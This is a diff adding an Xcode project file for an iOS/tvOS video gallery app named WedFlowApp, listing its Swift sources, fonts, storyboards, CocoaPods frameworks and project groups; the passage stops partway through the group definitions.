@@ -1,0 +1,1001 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		02E8E241DFC382892D1E6C57 /* Pods_WedFlowApp_WedFlowAppUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = AE76D8C3619DEC915A1B787C /* Pods_WedFlowApp_WedFlowAppUITests.framework */; };
+		832EB4C024A99E0900E6C12D /* User.swift in Sources */ = {isa = PBXBuildFile; fileRef = 832EB4BF24A99E0900E6C12D /* User.swift */; };
+		8331652526368C2500ED256C /* Spinner.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8331652426368C2500ED256C /* Spinner.swift */; };
+		8344C50C2627B0A20080A72B /* CustomFlowLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8344C50B2627B0A20080A72B /* CustomFlowLayout.swift */; };
+		834FF2BC24A9B85700C46CA0 /* GalleryListController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 834FF2BB24A9B85700C46CA0 /* GalleryListController.swift */; };
+		834FF2BE24AA503100C46CA0 /* GalleryCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 834FF2BD24AA503100C46CA0 /* GalleryCollectionViewCell.swift */; };
+		83610266252CE991008C4A02 /* MultiVideoCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 83610265252CE991008C4A02 /* MultiVideoCell.swift */; };
+		83658960261DE737003C6DBB /* ColumnFlowLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8365895F261DE736003C6DBB /* ColumnFlowLayout.swift */; };
+		8365896E261F7646003C6DBB /* CustomButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8365896D261F7645003C6DBB /* CustomButton.swift */; };
+		838E1671265181F000C80D3B /* ErrorController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 838E1670265181F000C80D3B /* ErrorController.swift */; };
+		838E1680265194E000C80D3B /* UIHelpers.swift in Sources */ = {isa = PBXBuildFile; fileRef = 838E167F265194E000C80D3B /* UIHelpers.swift */; };
+		8396096924A98803000AB018 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396096824A98803000AB018 /* AppDelegate.swift */; };
+		8396096B24A98803000AB018 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396096A24A98803000AB018 /* LoginViewController.swift */; };
+		8396096E24A98803000AB018 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8396096C24A98803000AB018 /* Main.storyboard */; };
+		8396097124A98803000AB018 /* WedFlowApp.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 8396096F24A98803000AB018 /* WedFlowApp.xcdatamodeld */; };
+		8396097324A98806000AB018 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8396097224A98806000AB018 /* Assets.xcassets */; };
+		8396097624A98806000AB018 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8396097424A98806000AB018 /* LaunchScreen.storyboard */; };
+		8396098124A98806000AB018 /* WedFlowAppTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396098024A98806000AB018 /* WedFlowAppTests.swift */; };
+		8396098C24A98806000AB018 /* WedFlowAppUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396098B24A98806000AB018 /* WedFlowAppUITests.swift */; };
+		8396D1AB24AAD14700EE36E1 /* SingleVideoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1AA24AAD14700EE36E1 /* SingleVideoViewController.swift */; };
+		8396D1AD24AB257500EE36E1 /* colorConvert.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1AC24AB257500EE36E1 /* colorConvert.swift */; };
+		8396D1AF24AB6CEE00EE36E1 /* SingleVideoGalleryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1AE24AB6CEE00EE36E1 /* SingleVideoGalleryViewController.swift */; };
+		8396D1B124ABB2F900EE36E1 /* AlbumViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1B024ABB2F900EE36E1 /* AlbumViewController.swift */; };
+		8396D1DB24AE657500EE36E1 /* Studioid.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D124AE657400EE36E1 /* Studioid.swift */; };
+		8396D1DC24AE657500EE36E1 /* UploadStatus.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D224AE657400EE36E1 /* UploadStatus.swift */; };
+		8396D1DD24AE657500EE36E1 /* Style.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D324AE657400EE36E1 /* Style.swift */; };
+		8396D1DE24AE657500EE36E1 /* JSONSchemaSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D424AE657400EE36E1 /* JSONSchemaSupport.swift */; };
+		8396D1DF24AE657500EE36E1 /* ContentType.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D524AE657400EE36E1 /* ContentType.swift */; };
+		8396D1E024AE657500EE36E1 /* Gallery.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D624AE657400EE36E1 /* Gallery.swift */; };
+		8396D1E124AE657500EE36E1 /* UserId.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D724AE657400EE36E1 /* UserId.swift */; };
+		8396D1E224AE657500EE36E1 /* CoverPhoto.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D824AE657400EE36E1 /* CoverPhoto.swift */; };
+		8396D1E324AE657500EE36E1 /* Thumbs.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1D924AE657400EE36E1 /* Thumbs.swift */; };
+		8396D1E424AE657500EE36E1 /* Studio.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1DA24AE657500EE36E1 /* Studio.swift */; };
+		8396D1E624AE657E00EE36E1 /* JSONHelpers.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1E524AE657E00EE36E1 /* JSONHelpers.swift */; };
+		8396D1E824AE66F000EE36E1 /* Set.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1E724AE66F000EE36E1 /* Set.swift */; };
+		8396D1EA24AE670B00EE36E1 /* Media.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1E924AE670B00EE36E1 /* Media.swift */; };
+		8396D1EC24AE676800EE36E1 /* MediaDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1EB24AE676800EE36E1 /* MediaDetail.swift */; };
+		8396D1EE24AE679200EE36E1 /* DetailDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1ED24AE679200EE36E1 /* DetailDetail.swift */; };
+		8396D1F024AE67B700EE36E1 /* Scene.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1EF24AE67B700EE36E1 /* Scene.swift */; };
+		8396D1F224AE67FD00EE36E1 /* Version.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1F124AE67FD00EE36E1 /* Version.swift */; };
+		8396D1F624AE831B00EE36E1 /* SideViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1F524AE831B00EE36E1 /* SideViewCell.swift */; };
+		8396D1F824AE87A000EE36E1 /* VideoPlayerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1F724AE87A000EE36E1 /* VideoPlayerViewController.swift */; };
+		8396D1FA24B342D200EE36E1 /* QueuePlayerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1F924B342D200EE36E1 /* QueuePlayerViewController.swift */; };
+		8396D1FC24B49A0F00EE36E1 /* AlbumCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8396D1FB24B49A0F00EE36E1 /* AlbumCollectionViewCell.swift */; };
+		83A6F8B826510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8B726510B8800ADC006 /* Montserrat-SemiBold.otf */; };
+		83A6F8B926510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8B726510B8800ADC006 /* Montserrat-SemiBold.otf */; };
+		83A6F8BA26510B8900ADC006 /* Montserrat-SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8B726510B8800ADC006 /* Montserrat-SemiBold.otf */; };
+		83A6F8BF26510B9400ADC006 /* Montserrat-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8BE26510B9400ADC006 /* Montserrat-Regular.otf */; };
+		83A6F8C026510B9400ADC006 /* Montserrat-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8BE26510B9400ADC006 /* Montserrat-Regular.otf */; };
+		83A6F8C126510B9400ADC006 /* Montserrat-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 83A6F8BE26510B9400ADC006 /* Montserrat-Regular.otf */; };
+		83BB0EED2549CE4200E8E108 /* Pods_WedFlowApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7018465EFA315D03E7185FDB /* Pods_WedFlowApp.framework */; };
+		99E0D86226C45E9ECF1F515C /* Pods_WedFlowAppTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 050D52DF63507C7DA3349D77 /* Pods_WedFlowAppTests.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		8396097D24A98806000AB018 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 8396095D24A98803000AB018 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 8396096424A98803000AB018;
+			remoteInfo = WedFlowApp;
+		};
+		8396098824A98806000AB018 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 8396095D24A98803000AB018 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 8396096424A98803000AB018;
+			remoteInfo = WedFlowApp;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		050D52DF63507C7DA3349D77 /* Pods_WedFlowAppTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_WedFlowAppTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		380451158AD9104580CE77CD /* Pods-WedFlowApp-WedFlowAppUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowApp-WedFlowAppUITests.debug.xcconfig"; path = "Target Support Files/Pods-WedFlowApp-WedFlowAppUITests/Pods-WedFlowApp-WedFlowAppUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		45BF12B316107F0F78AC04E4 /* Pods-WedFlowApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowApp.release.xcconfig"; path = "Target Support Files/Pods-WedFlowApp/Pods-WedFlowApp.release.xcconfig"; sourceTree = "<group>"; };
+		7018465EFA315D03E7185FDB /* Pods_WedFlowApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_WedFlowApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		832EB4BF24A99E0900E6C12D /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = User.swift; sourceTree = "<group>"; };
+		8331652426368C2500ED256C /* Spinner.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Spinner.swift; sourceTree = "<group>"; };
+		8344C50B2627B0A20080A72B /* CustomFlowLayout.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomFlowLayout.swift; sourceTree = "<group>"; };
+		834FF2BB24A9B85700C46CA0 /* GalleryListController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryListController.swift; sourceTree = "<group>"; };
+		834FF2BD24AA503100C46CA0 /* GalleryCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryCollectionViewCell.swift; sourceTree = "<group>"; };
+		83610265252CE991008C4A02 /* MultiVideoCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultiVideoCell.swift; sourceTree = "<group>"; };
+		8365895F261DE736003C6DBB /* ColumnFlowLayout.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColumnFlowLayout.swift; sourceTree = "<group>"; };
+		8365896D261F7645003C6DBB /* CustomButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomButton.swift; sourceTree = "<group>"; };
+		838E1670265181F000C80D3B /* ErrorController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ErrorController.swift; sourceTree = "<group>"; };
+		838E167F265194E000C80D3B /* UIHelpers.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIHelpers.swift; sourceTree = "<group>"; };
+		8396096524A98803000AB018 /* VidFlowTV.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VidFlowTV.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		8396096824A98803000AB018 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		8396096A24A98803000AB018 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
+		8396096D24A98803000AB018 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		8396097024A98803000AB018 /* WedFlowApp.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = WedFlowApp.xcdatamodel; sourceTree = "<group>"; };
+		8396097224A98806000AB018 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		8396097524A98806000AB018 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		8396097724A98806000AB018 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		8396097C24A98806000AB018 /* WedFlowAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = WedFlowAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		8396098024A98806000AB018 /* WedFlowAppTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WedFlowAppTests.swift; sourceTree = "<group>"; };
+		8396098224A98806000AB018 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		8396098724A98806000AB018 /* WedFlowAppUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = WedFlowAppUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		8396098B24A98806000AB018 /* WedFlowAppUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WedFlowAppUITests.swift; sourceTree = "<group>"; };
+		8396098D24A98806000AB018 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		8396D1AA24AAD14700EE36E1 /* SingleVideoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SingleVideoViewController.swift; sourceTree = "<group>"; };
+		8396D1AC24AB257500EE36E1 /* colorConvert.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = colorConvert.swift; sourceTree = "<group>"; };
+		8396D1AE24AB6CEE00EE36E1 /* SingleVideoGalleryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SingleVideoGalleryViewController.swift; sourceTree = "<group>"; };
+		8396D1B024ABB2F900EE36E1 /* AlbumViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumViewController.swift; sourceTree = "<group>"; };
+		8396D1D124AE657400EE36E1 /* Studioid.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Studioid.swift; sourceTree = "<group>"; };
+		8396D1D224AE657400EE36E1 /* UploadStatus.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UploadStatus.swift; sourceTree = "<group>"; };
+		8396D1D324AE657400EE36E1 /* Style.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Style.swift; sourceTree = "<group>"; };
+		8396D1D424AE657400EE36E1 /* JSONSchemaSupport.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JSONSchemaSupport.swift; sourceTree = "<group>"; };
+		8396D1D524AE657400EE36E1 /* ContentType.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContentType.swift; sourceTree = "<group>"; };
+		8396D1D624AE657400EE36E1 /* Gallery.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Gallery.swift; sourceTree = "<group>"; };
+		8396D1D724AE657400EE36E1 /* UserId.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserId.swift; sourceTree = "<group>"; };
+		8396D1D824AE657400EE36E1 /* CoverPhoto.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CoverPhoto.swift; sourceTree = "<group>"; };
+		8396D1D924AE657400EE36E1 /* Thumbs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Thumbs.swift; sourceTree = "<group>"; };
+		8396D1DA24AE657500EE36E1 /* Studio.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Studio.swift; sourceTree = "<group>"; };
+		8396D1E524AE657E00EE36E1 /* JSONHelpers.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JSONHelpers.swift; sourceTree = "<group>"; };
+		8396D1E724AE66F000EE36E1 /* Set.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Set.swift; sourceTree = "<group>"; };
+		8396D1E924AE670B00EE36E1 /* Media.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Media.swift; sourceTree = "<group>"; };
+		8396D1EB24AE676800EE36E1 /* MediaDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MediaDetail.swift; sourceTree = "<group>"; };
+		8396D1ED24AE679200EE36E1 /* DetailDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailDetail.swift; sourceTree = "<group>"; };
+		8396D1EF24AE67B700EE36E1 /* Scene.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Scene.swift; sourceTree = "<group>"; };
+		8396D1F124AE67FD00EE36E1 /* Version.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Version.swift; sourceTree = "<group>"; };
+		8396D1F524AE831B00EE36E1 /* SideViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideViewCell.swift; sourceTree = "<group>"; };
+		8396D1F724AE87A000EE36E1 /* VideoPlayerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPlayerViewController.swift; sourceTree = "<group>"; };
+		8396D1F924B342D200EE36E1 /* QueuePlayerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QueuePlayerViewController.swift; sourceTree = "<group>"; };
+		8396D1FB24B49A0F00EE36E1 /* AlbumCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumCollectionViewCell.swift; sourceTree = "<group>"; };
+		83A6F8B726510B8800ADC006 /* Montserrat-SemiBold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-SemiBold.otf"; sourceTree = "<group>"; };
+		83A6F8BE26510B9400ADC006 /* Montserrat-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Regular.otf"; sourceTree = "<group>"; };
+		AE76D8C3619DEC915A1B787C /* Pods_WedFlowApp_WedFlowAppUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_WedFlowApp_WedFlowAppUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		BDE718A7BC082D9B15725480 /* Pods-WedFlowAppTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowAppTests.release.xcconfig"; path = "Target Support Files/Pods-WedFlowAppTests/Pods-WedFlowAppTests.release.xcconfig"; sourceTree = "<group>"; };
+		ED2D3753CA96B663CE0442BD /* Pods-WedFlowApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowApp.debug.xcconfig"; path = "Target Support Files/Pods-WedFlowApp/Pods-WedFlowApp.debug.xcconfig"; sourceTree = "<group>"; };
+		F25A0CB40E3E7A329BC7069C /* Pods-WedFlowApp-WedFlowAppUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowApp-WedFlowAppUITests.release.xcconfig"; path = "Target Support Files/Pods-WedFlowApp-WedFlowAppUITests/Pods-WedFlowApp-WedFlowAppUITests.release.xcconfig"; sourceTree = "<group>"; };
+		F464F8253228AF44E2FB42FB /* Pods-WedFlowAppTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WedFlowAppTests.debug.xcconfig"; path = "Target Support Files/Pods-WedFlowAppTests/Pods-WedFlowAppTests.debug.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		8396096224A98803000AB018 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				83BB0EED2549CE4200E8E108 /* Pods_WedFlowApp.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396097924A98806000AB018 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				99E0D86226C45E9ECF1F515C /* Pods_WedFlowAppTests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8396098424A98806000AB018 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				02E8E241DFC382892D1E6C57 /* Pods_WedFlowApp_WedFlowAppUITests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		1D67618CDF620D11D5002243 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				ED2D3753CA96B663CE0442BD /* Pods-WedFlowApp.debug.xcconfig */,
+				45BF12B316107F0F78AC04E4 /* Pods-WedFlowApp.release.xcconfig */,
+				380451158AD9104580CE77CD /* Pods-WedFlowApp-WedFlowAppUITests.debug.xcconfig */,
+				F25A0CB40E3E7A329BC7069C /* Pods-WedFlowApp-WedFlowAppUITests.release.xcconfig */,
+				F464F8253228AF44E2FB42FB /* Pods-WedFlowAppTests.debug.xcconfig */,
+				BDE718A7BC082D9B15725480 /* Pods-WedFlowAppTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		832EB4BB24A99B1800E6C12D /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				8396D1D524AE657400EE36E1 /* ContentType.swift */,
+				8396D1D824AE657400EE36E1 /* CoverPhoto.swift */,
+				8396D1D624AE657400EE36E1 /* Gallery.swift */,
+				8396D1D424AE657400EE36E1 /* JSONSchemaSupport.swift */,
+				8396D1DA24AE657500EE36E1 /* Studio.swift */,
+				8396D1D124AE657400EE36E1 /* Studioid.swift */,
+				8396D1D324AE657400EE36E1 /* Style.swift */,
+				8396D1D924AE657400EE36E1 /* Thumbs.swift */,
+				8396D1D224AE657400EE36E1 /* UploadStatus.swift */,
+				8396D1D724AE657400EE36E1 /* UserId.swift */,
+				832EB4BF24A99E0900E6C12D /* User.swift */,
+				8396D1E724AE66F000EE36E1 /* Set.swift */,
+				8396D1E924AE670B00EE36E1 /* Media.swift */,
+				8396D1EB24AE676800EE36E1 /* MediaDetail.swift */,
+				8396D1ED24AE679200EE36E1 /* DetailDetail.swift */,
+				8396D1EF24AE67B700EE36E1 /* Scene.swift */,
+				8396D1F124AE67FD00EE36E1 /* Version.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		832EB4BD24A99B3500E6C12D /* Helpers */ = {
+			isa = PBXGroup;
+			children = (
+				8396D1E524AE657E00EE36E1 /* JSONHelpers.swift */,
+				8396096824A98803000AB018 /* AppDelegate.swift */,
+				8396D1AC24AB257500EE36E1 /* colorConvert.swift */,
+				8331652426368C2500ED256C /* Spinner.swift */,
+				838E1670265181F000C80D3B /* ErrorController.swift */,
+				838E167F265194E000C80D3B /* UIHelpers.swift */,
+			);
+			path = Helpers;
+			sourceTree = "<group>";
+		};
+		832EB4BE24A99B5100E6C12D /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				8396096A24A98803000AB018 /* LoginViewController.swift */,
+				834FF2BB24A9B85700C46CA0 /* GalleryListController.swift */,
+				8396D1AA24AAD14700EE36E1 /* SingleVideoViewController.swift */,
+				8396D1AE24AB6CEE00EE36E1 /* SingleVideoGalleryViewController.swift */,
+				8396D1B024ABB2F900EE36E1 /* AlbumViewController.swift */,
+				8396D1F724AE87A000EE36E1 /* VideoPlayerViewController.swift */,
+				8396D1F924B342D200EE36E1 /* QueuePlayerViewController.swift */,
+				8365895F261DE736003C6DBB /* ColumnFlowLayout.swift */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		832EB4C424A9ACCB00E6C12D /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				834FF2BD24AA503100C46CA0 /* GalleryCollectionViewCell.swift */,
+				8396D1FB24B49A0F00EE36E1 /* AlbumCollectionViewCell.swift */,
+				8396D1F524AE831B00EE36E1 /* SideViewCell.swift */,
+				83610265252CE991008C4A02 /* MultiVideoCell.swift */,
+				8365896D261F7645003C6DBB /* CustomButton.swift */,
+				8344C50B2627B0A20080A72B /* CustomFlowLayout.swift */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		832EB4C524A9ACE500E6C12D /* ApiService */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = ApiService;
+			sourceTree = "<group>";
+		};
+		834FF2BA24A9B28500C46CA0 /* Storyboards */ = {
+			isa = PBXGroup;
+			children = (
+				8396097424A98806000AB018 /* LaunchScreen.storyboard */,
+				8396096C24A98803000AB018 /* Main.storyboard */,
+			);
+			path = Storyboards;
+			sourceTree = "<group>";
+		};
+		8396095C24A98803000AB018 = {
+			isa = PBXGroup;
+			children = (
+				8396096724A98803000AB018 /* WedFlowApp */,
+				8396097F24A98806000AB018 /* WedFlowAppTests */,
+				8396098A24A98806000AB018 /* WedFlowAppUITests */,
+				8396096624A98803000AB018 /* Products */,
+				1D67618CDF620D11D5002243 /* Pods */,
+				EA245755AD8D20AE73177DB2 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		8396096624A98803000AB018 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				8396096524A98803000AB018 /* VidFlowTV.app */,
+				8396097C24A98806000AB018 /* WedFlowAppTests.xctest */,
+				8396098724A98806000AB018 /* WedFlowAppUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		8396096724A98803000AB018 /* WedFlowApp */ = {
+			isa = PBXGroup;
+			children = (
+				83A6F8B626510B1A00ADC006 /* Fonts */,
+				832EB4BE24A99B5100E6C12D /* Controllers */,
+				834FF2BA24A9B28500C46CA0 /* Storyboards */,
+				832EB4C524A9ACE500E6C12D /* ApiService */,
+				832EB4C424A9ACCB00E6C12D /* Views */,
+				832EB4BD24A99B3500E6C12D /* Helpers */,
+				832EB4BB24A99B1800E6C12D /* Model */,
+				8396097224A98806000AB018 /* Assets.xcassets */,
+				8396097724A98806000AB018 /* Info.plist */,
+				8396096F24A98803000AB018 /* WedFlowApp.xcdatamodeld */,
+			);
+			path = WedFlowApp;
+			sourceTree = "<group>";
+		};
+		8396097F24A98806000AB018 /* WedFlowAppTests */ = {
+			isa = PBXGroup;
+			children = (
+				8396098024A98806000AB018 /* WedFlowAppTests.swift */,
+				8396098224A98806000AB018 /* Info.plist */,
+			);
+			path = WedFlowAppTests;
+			sourceTree = "<group>";
+		};
+		8396098A24A98806000AB018 /* WedFlowAppUITests */ = {
+			isa = PBXGroup;
+			children = (
+				8396098B24A98806000AB018 /* WedFlowAppUITests.swift */,
+				8396098D24A98806000AB018 /* Info.plist */,
+			);
+			path = WedFlowAppUITests;
+			sourceTree = "<group>";
+		};
+		83A6F8B626510B1A00ADC006 /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				83A6F8BE26510B9400ADC006 /* Montserrat-Regular.otf */,
+				83A6F8B726510B8800ADC006 /* Montserrat-SemiBold.otf */,
+			);
+			path = Fonts;
+			sourceTree = "<group>";
+		};
+		EA245755AD8D20AE73177DB2 /* Frameworks */ = {
